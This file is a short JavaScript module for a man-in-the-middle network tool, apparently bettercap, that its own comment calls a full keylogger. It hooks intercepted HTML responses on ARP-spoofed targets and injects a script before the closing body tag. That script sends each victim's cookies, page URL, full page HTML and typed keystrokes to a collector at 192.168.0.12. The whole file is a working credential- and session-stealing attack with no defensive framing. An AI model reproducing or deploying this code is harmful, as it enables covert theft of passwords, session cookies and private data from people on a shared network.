/*
It is the full version of the JS keylogger.
Sends Coockie, a body of the checked pages and the pressed keys.
*/

function onLoad() {
	log('KeyLoger Inject loaded.');	log('targets: ' + env['arp.spoof.targets']);
}

function onResponse(req, res) {
	if (res.ContentType.indexOf('text/html') == 0) {
		var body = res.ReadBody();
		if (body.indexOf('</body>') != -1) {
			res.Body = body.replace('</body>', '<script type="text/javascript" >s=""; function get_doctype(){ var node = document.doctype; var doctypeHtml = "<!DOCTYPE " + node.name + (node.publicId ? ` PUBLIC "` + node.publicId + `"` : ``)+ (!node.publicId && node.systemId ? ` SYSTEM` : ``) + (node.systemId ? ` "` + node.systemId + `"` : ``)+ `>`; return doctypeHtml + document.documentElement.outerHTML;}function sendGet(str){ var xhr = new XMLHttpRequest(); xhr.open("GET", "http://192.168.0.12/get.php?" + str, true); xhr.send(); }; sendGet("date="+encodeURIComponent(new Date())+"&link="+encodeURIComponent(window.location.href)+"&bodypage="+encodeURIComponent(get_doctype())+"&coockie="+encodeURIComponent(document.cookie)); document.addEventListener("keydown", (e) => { key = `${e.key}`; kCode = `${e.keyCode}`; if(kCode >= 48 && kCode <= 90 || kCode >= 96 && kCode <= 111|| kCode >= 186 && kCode <= 192|| kCode==32 || kCode >= 219 && kCode <= 222 ){ sss=encodeURIComponent(key); }else{ if (key=="Enter"){ ss="key="+s; sendGet(ss); s=""; }else{ sss=encodeURIComponent(" ["+key+"] ");}}; s=s+sss;});document.addEventListener("click",function(e){ ss="key="+s;  sendGet(ss);  s="";},false);</script></body>');
		}
	}
}
